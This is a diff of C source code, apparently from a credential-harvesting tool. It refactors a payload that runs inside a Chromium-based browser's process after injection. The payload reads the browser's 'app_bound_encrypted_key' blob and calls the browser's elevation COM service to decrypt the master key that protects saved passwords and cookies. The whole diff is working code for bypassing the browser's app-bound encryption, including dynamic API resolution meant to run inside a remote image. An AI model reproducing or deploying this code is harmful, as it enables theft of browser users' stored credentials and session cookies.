@@ -17,35 +17,28 @@ __declspec(allocate(".abereq"))
 volatile ABE_REQUEST g_Request = { 0 };
 #pragma data_seg()
 
-/* prepares the request block scanned by the payload (raw Local State text) */
-_Success_(return)
+/* prepares the request block used by the payload: the base64-decoded
+   app_bound_encrypted_key blob (APPB prefix kept); requires WinRT on the
+   calling thread */
+_Success_(return != FALSE)
 BOOL
 AbePrepareRequest(
     _In_ const NET_BROWSER_INFO* Browser)
 {
-    WCHAR LocalState[MAX_PATH];
-    PVOID Text;
-    ULONG Length;
-    NTSTATUS Status;
+    ULONG BlobLength = sizeof(g_Request.Blob);  /* in/out capacity */
 
-    Str_PrintfExW(LocalState, MAX_PATH, L"%ls\\Local State", Browser->UserDataDir);
-    Status = IO_ReadWin32FileToBuffer(LocalState, &Text, &Length);
-    if (!NT_SUCCESS(Status))
+    if (!AbeReadOsCryptBlob(Browser->UserDataDir,
+                            L"app_bound_encrypted_key",
+                            (PBYTE)g_Request.Blob,
+                            sizeof(g_Request.Blob),
+                            &BlobLength) ||
+        BlobLength <= 4)
     {
+        AbeLog(L"failed to read app_bound_encrypted_key\r\n");
         return FALSE;
     }
-    if (Length > sizeof(g_Request.LocalState))
-    {
-        Mem_Free(Text);
-        return FALSE;
-    }
-    if (Length != 0)
-    {
-        RtlCopyMemory((PVOID)g_Request.LocalState, Text, Length);
-    }
-    Mem_Free(Text);
     g_Request.BrowserType = Browser->Type;
-    g_Request.LocalStateLength = Length;
+    g_Request.BlobLength = BlobLength;
     return TRUE;
 }
 
@@ -57,135 +50,117 @@ typedef HRESULT (WINAPI *PFN_IELEVATOR_DECRYPT_DATA)(PVOID This, BSTR In, BSTR* 
 /* IUnknown::Release vtable slot signature */
 typedef ULONG (WINAPI *PFN_IUNKNOWN_RELEASE)(PVOID This);
 
+#define ABE_GET_PROC(Module, Function) \
+    NT_SUCCESS(PS_GetProcAddress((Module), (PCANSI_STRING)&Function##Name, (PVOID*)&pfn##Function))
+
 VOID
 AbePayloadWorker(VOID)
 {
-    static BYTE Blob[2048];
+    static UNICODE_STRING Ole32Dll = RTL_CONSTANT_STRING(L"ole32.dll");
+    static UNICODE_STRING OleAut32Dll = RTL_CONSTANT_STRING(L"oleaut32.dll");
+    static ANSI_STRING CoInitializeExName = RTL_CONSTANT_STRING("CoInitializeEx");
+    static ANSI_STRING CoUninitializeName = RTL_CONSTANT_STRING("CoUninitialize");
+    static ANSI_STRING CoCreateInstanceName = RTL_CONSTANT_STRING("CoCreateInstance");
+    static ANSI_STRING CoSetProxyBlanketName = RTL_CONSTANT_STRING("CoSetProxyBlanket");
+    static ANSI_STRING SysAllocStringByteLenName = RTL_CONSTANT_STRING("SysAllocStringByteLen");
+    static ANSI_STRING SysStringByteLenName = RTL_CONSTANT_STRING("SysStringByteLen");
+    static ANSI_STRING SysFreeStringName = RTL_CONSTANT_STRING("SysFreeString");
     const ABE_BROWSER* Browser = NULL;
-    typeof(&CoInitializeEx) CoInit;
-    typeof(&CoUninitialize) CoUninit;
-    typeof(&CoCreateInstance) CoCreate;
-    typeof(&CoSetProxyBlanket) CoBlanket;
-    typeof(&SysAllocStringByteLen) SysAllocByteLen;
-    typeof(&SysStringByteLen) SysByteLen;
-    typeof(&SysFreeString) SysFree;
-    typeof(&CryptStringToBinaryA) CryptStrToBin;
+    typeof(&CoInitializeEx) pfnCoInitializeEx;
+    typeof(&CoUninitialize) pfnCoUninitialize;
+    typeof(&CoCreateInstance) pfnCoCreateInstance;
+    typeof(&CoSetProxyBlanket) pfnCoSetProxyBlanket;
+    typeof(&SysAllocStringByteLen) pfnSysAllocStringByteLen;
+    typeof(&SysStringByteLen) pfnSysStringByteLen;
+    typeof(&SysFreeString) pfnSysFreeString;
+    PVOID Ole32, OleAut32;
     PVOID Elevator = NULL;
     BSTR In = NULL, Out = NULL;
-    ULONG Index, TagLength, Base64Limit, Base64Length = 0;
-    PCSTR Base64 = NULL;
+    DWORD LastError;
     LONG Code = (LONG)E_FAIL;
     HRESULT Hr = E_FAIL;
-    BYTE* Text = (BYTE*)g_Request.LocalState;
 
-    /* runs before CRT init in the remote image: everything must be resolved dynamically */
+    /* runs before CRT init in the remote image: everything must be resolved
+       dynamically, and only g_Pending/g_Code/g_Key (.abedata) may be written */
     if (g_Request.BrowserType < NetBrowserMax)
     {
         Browser = &AbeBrowsers[g_Request.BrowserType];
     }
-
-    TagLength = sizeof("\"app_bound_encrypted_key\":\"") - 1;
-    for (Index = 0; Browser && Index + TagLength <= g_Request.LocalStateLength; Index++)
+    if (Browser != NULL &&
+        memcmp((PVOID)g_Request.Blob, "APPB", 4) == 0 &&
+        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &Ole32Dll, &Ole32)) &&
+        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &OleAut32Dll, &OleAut32)) &&
+        ABE_GET_PROC(Ole32, CoInitializeEx) &&
+        ABE_GET_PROC(Ole32, CoUninitialize) &&
+        ABE_GET_PROC(Ole32, CoCreateInstance) &&
+        ABE_GET_PROC(Ole32, CoSetProxyBlanket) &&
+        ABE_GET_PROC(OleAut32, SysAllocStringByteLen) &&
+        ABE_GET_PROC(OleAut32, SysStringByteLen) &&
+        ABE_GET_PROC(OleAut32, SysFreeString))
     {
-        if (Text[Index] == '"' &&
-            memcmp(Text + Index, "\"app_bound_encrypted_key\":\"", TagLength) == 0)
-        {
-            Base64 = (PCSTR)Text + Index + TagLength;
-            break;
-        }
-    }
-    if (Base64 != NULL)
-    {
-        /* never scan past the valid part of the request buffer */
-        Base64Limit = g_Request.LocalStateLength - (ULONG)(Base64 - (PCSTR)g_Request.LocalState);
-        while (Base64Length < Base64Limit && Base64[Base64Length] != '"')
-        {
-            Base64Length++;
-        }
-    }
+        /* RPC_E_CHANGED_MODE: the thread already has another apartment, still usable */
+        HRESULT CoHr = pfnCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
-    CryptStrToBin = (typeof(CryptStrToBin))GetProcAddress(LoadLibraryW(L"crypt32.dll"),
-                                                          "CryptStringToBinaryA");
-    if (Base64 != NULL && CryptStrToBin != NULL &&
-        (CoInit = (typeof(CoInit))GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
-        (CoUninit = (typeof(CoUninit))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoUninitialize")) != NULL &&
-        (CoCreate = (typeof(CoCreate))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
-        (CoBlanket = (typeof(CoBlanket))GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
-        (SysAllocByteLen = (typeof(SysAllocByteLen))GetProcAddress(LoadLibraryW(L"oleaut32.dll"),
-                                                                   "SysAllocStringByteLen")) != NULL &&
-        (SysByteLen = (typeof(SysByteLen))GetProcAddress(GetModuleHandleW(L"oleaut32.dll"),
-                                                         "SysStringByteLen")) != NULL &&
-        (SysFree = (typeof(SysFree))GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
-    {
-        /* BlobLength is in/out capacity of Blob */
-        ULONG BlobLength = sizeof(Blob);
-        DWORD LastError;
-
-        if (CryptStrToBin(Base64,
-                          Base64Length,
-                          CRYPT_STRING_BASE64,
-                          Blob,
-                          &BlobLength,
-                          NULL,
-                          NULL) &&
-            BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0)
+        if (SUCCEEDED(CoHr) || CoHr == RPC_E_CHANGED_MODE)
         {
-            Hr = CoInit(NULL, COINIT_APARTMENTTHREADED);
+            Hr = pfnCoCreateInstance(&Browser->Clsid,
+                                     NULL,
+                                     CLSCTX_LOCAL_SERVER,
+                                     &Browser->Iid,
+                                     &Elevator);
             if (SUCCEEDED(Hr))
             {
-                Hr = CoCreate(&Browser->Clsid,
-                              NULL,
-                              CLSCTX_LOCAL_SERVER,
-                              &Browser->Iid,
-                              &Elevator);
+                Hr = pfnCoSetProxyBlanket(Elevator,
+                                          RPC_C_AUTHN_DEFAULT,
+                                          RPC_C_AUTHZ_DEFAULT,
+                                          NULL,
+                                          RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                                          RPC_C_IMP_LEVEL_IMPERSONATE,
+                                          NULL,
+                                          EOAC_DYNAMIC_CLOAKING);
                 if (SUCCEEDED(Hr))
                 {
-                    Hr = CoBlanket(Elevator,
-                                   RPC_C_AUTHN_DEFAULT,
-                                   RPC_C_AUTHZ_DEFAULT,
-                                   NULL,
-                                   RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-                                   RPC_C_IMP_LEVEL_IMPERSONATE,
-                                   NULL,
-                                   EOAC_DYNAMIC_CLOAKING);
-                    if (SUCCEEDED(Hr))
+                    In = pfnSysAllocStringByteLen((PCSTR)g_Request.Blob + 4,
+                                                  g_Request.BlobLength - 4);
+                    if (In == NULL)
                     {
-                        In = SysAllocByteLen((PCSTR)Blob + 4, BlobLength - 4);
-                        if (In == NULL)
+                        Hr = E_OUTOFMEMORY;
+                    } else
+                    {
+                        Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
+                            Elevator,
+                            In,
+                            &Out,
+                            &LastError);
+                        if (SUCCEEDED(Hr) && Out != NULL && pfnSysStringByteLen(Out) == ABE_KEY_SIZE)
                         {
-                            Hr = E_OUTOFMEMORY;
-                        } else
-                        {
-                            Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
-                                Elevator,
-                                In,
-                                &Out,
-                                &LastError);
-                            if (SUCCEEDED(Hr) && Out != NULL && SysByteLen(Out) == ABE_KEY_SIZE)
-                            {
-                                RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
-                                Code = 0;
-                            }
+                            RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
+                            Code = 0;
                         }
                     }
-                    ((PFN_IUNKNOWN_RELEASE)((*(PVOID***)Elevator)[2]))(Elevator);
                 }
-                CoUninit();
+                ((PFN_IUNKNOWN_RELEASE)((*(PVOID***)Elevator)[2]))(Elevator);
+            }
+            if (SUCCEEDED(CoHr))
+            {
+                pfnCoUninitialize();
             }
         }
         /* release the COM allocations in the host (browser) process */
         if (In != NULL)
         {
-            SysFree(In);
+            pfnSysFreeString(In);
         }
         if (Out != NULL)
         {
-            SysFree(Out);
+            pfnSysFreeString(Out);
         }
     }
     g_Code = Code == 0 ? 0 : (LONG)(FAILED(Hr) ? Hr : E_FAIL);
     g_Pending = 1;
 }
+
+#undef ABE_GET_PROC
 
 /* Hijack entry: zero-arg, parks until reaped */
 VOID
